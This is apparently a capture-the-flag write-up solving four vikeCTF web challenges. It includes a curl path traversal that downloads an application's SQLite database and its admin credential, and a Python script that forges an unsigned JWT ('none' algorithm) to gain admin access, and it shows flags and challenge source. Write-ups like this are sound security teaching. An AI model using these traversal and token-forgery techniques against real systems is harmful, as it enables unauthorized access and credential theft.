# Web Challenges

## vikeMERCH

### Description

Welcome to vikeMERCH, your one stop shop for Viking-themed merchandise! We're still working on our website, but don't let that stop you from browsing our high-quality items. We just know you'll love the Viking sweater vest.

[http://35.94.129.106:3001](http://35.94.129.106:3001/)

[vikemerch.zip](https://ctf.vikesec.ca/files/a257384bcf3f397e09e3f59baab78212/vikemerch.zip?token=eyJ1c2VyX2lkIjo1NDcsInRlYW1faWQiOjQwNSwiZmlsZV9pZCI6N30.Ze1-HA.BO9wSc9Mv5oVSBISjQhfYIYwmyE)

### Analysis


::: details Dockerfile
Dockerfile is normal usual build you can find everywhere, but with a bit of twist. `scratch` container image is used to run single binary files so the container only has binary, assets and database.

```bash
FROM golang:1.22.0-alpine as builder

RUN apk update && apk add xxd sqlite tar xz

WORKDIR /zig

ADD https://ziglang.org/download/0.11.0/zig-linux-x86_64-0.11.0.tar.xz zig.tar.xz
RUN tar -xf zig.tar.xz
RUN mv zig-linux-x86_64-0.11.0/* . && rmdir zig-linux-x86_64-0.11.0

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY views/ ./views/
COPY main.go ./

# zig cc is for static CGO binaries
RUN CGO_ENABLED=1 GOOS=linux \
    CC="/zig/zig cc -target native-native-musl" \
    CXX="/zig/zig cc -target native-native-musl" \
    go build -v -o vikemerch .

COPY seed.sh ./
RUN ./seed.sh

RUN rm -rf views main.go go.mod go.sum seed.sh


FROM scratch 

COPY --from=alpine:latest /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/

WORKDIR /app

COPY assets/ ./assets/

COPY --from=builder /app/ .

EXPOSE 8080

CMD ["./vikemerch"]
```
:::


The main binary used is `main.go` which handles all requests, it's using latest version of packages so no vulnaribility there.


::: details main.go
```go
package main

import (
	"crypto/subtle"
	"embed"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"path/filepath"

	"github.com/gin-gonic/gin"
	"github.com/jmoiron/sqlx"
	_ "github.com/mattn/go-sqlite3"
)

//go:embed views
var viewFS embed.FS

func must(err error) {
	if err != nil {
		fmt.Fprintln(os.Stderr, "Fatal error:", err)
		os.Exit(1)
	}
}

var flag string = os.Getenv("FLAG")

type Cents int

func (c Cents) String() string {
	return fmt.Sprintf("$%v.%02d", int(c)/100, int(c)%100)
}

type Listing struct {
	ID          string
	Title       string
	Description string
	PriceCents  Cents `db:"priceCents"`
	Image       string
}

type User struct {
	Username string
	Password string
}

func main() {
	db := sqlx.MustOpen("sqlite3", "file:db.sqlite3")

	e := gin.Default()
	e.SetHTMLTemplate(template.Must(template.ParseFS(viewFS, "views/**")))

	e.GET("/", func(c *gin.Context) {
		listings := make([]Listing, 0)
		err := db.Select(&listings, "SELECT * FROM listing;")
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "index.html", gin.H{"Listings": listings})
	})
	e.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		listings := make([]Listing, 0)
		err := db.Select(&listings, `
			SELECT *
			FROM listing
			WHERE title LIKE '%' || ? || '%'
			OR description LIKE '%' || ? || '%';
		`, query, query)
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "search.html", gin.H{
			"Listings": listings,
			"Query":    query,
		})
	})
	e.GET("/product", func(c *gin.Context) {
		id := c.Query("id")
		var listing Listing
		err := db.Get(&listing, "SELECT * from listing WHERE id = ?;", id)
		if err != nil {
			c.AbortWithError(404, err)
			return
		}
		c.HTML(http.StatusOK, "product.html", listing)
	})
	e.GET("/assets", func(c *gin.Context) {
		id := c.Query("id")
		path := filepath.Join("assets", filepath.Clean(id))
		c.File(path)
	})
	e.GET("/cart", underConstruction)
	e.GET("/admin", func(c *gin.Context) {
		cookie, err := c.Cookie("FLAG")
		if err != nil || subtle.ConstantTimeCompare([]byte(cookie), []byte(flag)) == 0 {
			c.HTML(http.StatusOK, "admin.html", nil)
			return
		}
		c.String(http.StatusOK, flag)
	})
	e.POST("/admin", func(c *gin.Context) {
		username := c.PostForm("username")
		password := c.PostForm("password")
		var user User
		err := db.Get(&user, "SELECT * FROM user WHERE username = ?", username)
		if err != nil {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		if subtle.ConstantTimeCompare([]byte(password), []byte(user.Password)) == 0 {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		c.Writer.Header().Add("Set-Cookie", "FLAG="+flag)
		c.Writer.Header().Add("Content-Type", "text/plain")
		c.Writer.WriteString(flag)
	})

	if os.Getenv("LIVE_RELOAD") != "" {
		e.Use(func(c *gin.Context) {
			e.LoadHTMLGlob("views/**")
		})
	}

	must(e.Run("0.0.0.0:8080"))
}

func underConstruction(c *gin.Context) {
	c.HTML(http.StatusOK, "under-construction.html", gin.H{"BackURL": c.Request.Referer()})
}
```
:::


The function `underConstruction` seemed vulnarable, because we can control Referer header but no [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

```go
func underConstruction(c *gin.Context) {
	c.HTML(http.StatusOK, "under-construction.html", gin.H{"BackURL": c.Request.Referer()})
}
```

No SQLi because the code is using **[Parameterized Queries](https://www.wikiwand.com/en/Prepared_statement)** which are mostly safe from SQLi.

For password comparision **[subtle.ConstantTimeCompare](https://pkg.go.dev/crypto/subtle#ConstantTimeCompare)** is used, which is most secure function so far to compare 2 strings AFAIK. This also means no [timing attacks](https://www.wikiwand.com/en/Timing_attack).

So where is the attack vector?...

`assets` endpoint was only way to exfiltrate data, but **[filepath.Clean](https://pkg.go.dev/path/filepath#Clean)** is not exactly "safe" or works how we think.<br>
More about [filepath.Clean](https://github.com/golang/go/issues/16111)
```go
e.GET("/assets", func(c *gin.Context) {
    id := c.Query("id")
    path := filepath.Join("assets", filepath.Clean(id))
    c.File(path)
})
```

Example: [Playground](https://go.dev/play/p/0m35rHNCqmE)

```go
package main

import (
	"fmt"
	"path/filepath"
)

func main() {
    // Returns: Path: ../db.sqlite3
	fmt.Printf("Path: %s\n", filepath.Clean("../db.sqlite3"))
    // Returns: Path: Path: /db.sqlite3
	fmt.Printf("Path: %s\n", filepath.Clean("/../db.sqlite3"))
}
```

### Solution 

```bash
└─$ curl 'http://35.94.129.106:3001/assets?id=../db.sqlite3' --path-as-is -o db.sqlite3
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16384  100 16384    0     0  23849      0 --:--:-- --:--:-- --:--:-- 23883
```

```sql
└─$ sqlite3 db.sqlite3
SQLite version 3.45.0 2024-01-15 17:01:13
Enter ".help" for usage hints.
sqlite> SELECT * FROM user;
admin|a36dc27c2955d4d4ec31f351c49fc7ac63b7e98908077bd1a7f0cfce1875c03d
```

Login as admin from UI and get flag. or curl:

```bash
└─$ curl 'http://35.94.129.106:3001/admin' -d 'username=admin&password=a36dc27c2955d4d4ec31f351c49fc7ac63b7e98908077bd1a7f0cfce1875c03d'
vikeCTF{whY_w0ulD_g0_d0_th15}
```
::: tip Flag
`vikeCTF{whY_w0ulD_g0_d0_th15}`
:::


## Ponies

### Description

OH NO, where did all these ponies come from??? Quick, get the flag and sail away before we are overrun!

[http://35.94.129.106:3009](http://35.94.129.106:3009/)

### Solution

If we take a look at source code we can see javascript file being included:

```js
function recursiveSpawn() {
    BrowserPonies.spawnRandom(incrementalPonies);
    if (!BrowserPonies.running()) {
        counter = counter + 1;
        document.getElementById("flag").innerHTML = "arriving shortly" + ".".repeat(counter % 4);
        setTimeout(recursiveSpawn, intervalMs);
    } else {
        setTimeout(() => {
            var tag = document.createElement("script");
            tag.src = "/gag.js";
            document.getElementsByTagName("head")[0].appendChild(tag);
        }, "7000");
    }
}
recursiveSpawn();
```

```bash
└─$ curl http://35.94.129.106:3009/gag.js
document.getElementById("flag").innerHTML = "vikeCTF{ponies_for_life}";
```
::: tip Flag
`vikeCTF{ponies_for_life}`
:::


## movieDB

### Description

Ahoy, ye brave movie seekers! Welcome to MovieDB, where the flicks flow like mead and the security... well, let's just say it's a bit like an unlocked treasure chest in a Viking village. But fret not! With a sprinkle of humor and a dash of caution, we'll navigate these cinematic seas together, laughing in the face of cyber shenanigans. So grab your popcorn and let's pillage... I mean, peruse through our database of movie marvels!

[http://35.94.129.106:3003](http://35.94.129.106:3003/)

### Analysis

The application let's us query movies and it has many filters. 

![moviedb-1](/assets/ctf/vikectf/moviedb-1.png)

I tried different payloads to trigger some kind of error on Title, but no luck. I thought this would be blind SQLi.

Filters only accepted numbers, so no injection there.

```html
            <h1>Something went wrong!</h1>
            <pre>Traceback (most recent call last):
  File "/app/server.py", line 42, in home
    params.append(float(min_rating))
                  ^^^^^^^^^^^^^^^^^
ValueError: could not convert string to float: "'"
</pre>
```

I gave up on injection since no payload seemed to work and decided to enumerate. Visiting `/robots.txt` we get `/static/flag.txt` and if we visit path we get `no`...
1. flag.txt's content is really `no`
2. Some kind of IP block, e.g.: only localhost can access it.

Before tampering with headers I decided to backtrack a little.

1. <http://35.94.129.106:3003/static/> -> 404 Not Found
2. <http://35.94.129.106:3003/static> -> Directory Listing

Notice the slash at the end of the path.

### Solution

<http://35.94.129.106:3003/static/flag.txt/> -> `vikeCTF{y0u_tH0Gh7_iT_w4S_5QL_1Nj3c7i0n}`

The flag.txt was a route, not file.
::: tip Flag
`vikeCTF{y0u_tH0Gh7_iT_w4S_5QL_1Nj3c7i0n}`
:::

## Jarls Weakened Trust

### Description

Jarl's been bragging about becoming an admin on the new axe sharing network. Can you?

[http://35.94.129.106:3004](http://35.94.129.106:3004/)

### Solution

The application is based on JWT token. If you login with anything you get:

```
Someone with admin permissions will approve your application within the next millenium
```

![jarl-1](/assets/ctf/vikectf/jarl-1.png)

JWT Token has random userId and admin set to `false` by default. I had 2 attack vectors in mind:
1. Change algorithm
    * `none` algorithm completely removes use of secret key.
2. Bruteforce the key
    * Can be done with john/hashcat/jwt_tool.

I first used <https://token.dev> to change algorithm to `none`, admin -> true and finally change the cookie to become admin. 

![jarl-2](/assets/ctf/vikectf/jarl-2.png)

But this didnt work and I got kicked out of session.

Bruteforce approach also didn't return anything.

Since the only valid approach was algorithm none I decided to automate process with python to check if time was the issue. 

```py
import requests
import string
import random
import jwt
import re

random_string = lambda length: ''.join(random.choice(string.ascii_letters) for _ in range(length)) 

URL = 'http://35.94.129.106:3004/'

resp = requests.post(URL+'join', data={'username': random_string(5), 'password': random_string(5)}, allow_redirects=False)
jwt_token = re.search(r'=(.*?);', resp.headers['Set-Cookie']).group(1)
print(jwt_token)

jwt_token = jwt.decode(jwt_token, options={'verify_signature': False})
jwt_token['admin'] = True
print(jwt_token)

jwt_token = jwt.encode(jwt_token, key='', algorithm=None)
print(jwt_token)

resp = requests.get(URL, cookies=dict(AUTHORIZATION=jwt_token))
flag = re.findall('vikeCTF\{.*?\}', resp.text)
print(flag)
```

<small><em>I dont know why I used lambda..... Im ashamed of it, but not gonna change it</em></small>

And it worked, but the problem was the `.` at the end. Since jwt consists of 3 parts it needs 2 `.` seperator. <https://token.dev> removed the dot and hence the first approach failed _miserably_.
::: tip Flag
`vikeCTF{134rN_Y0Ur_4160r17HM5}`
:::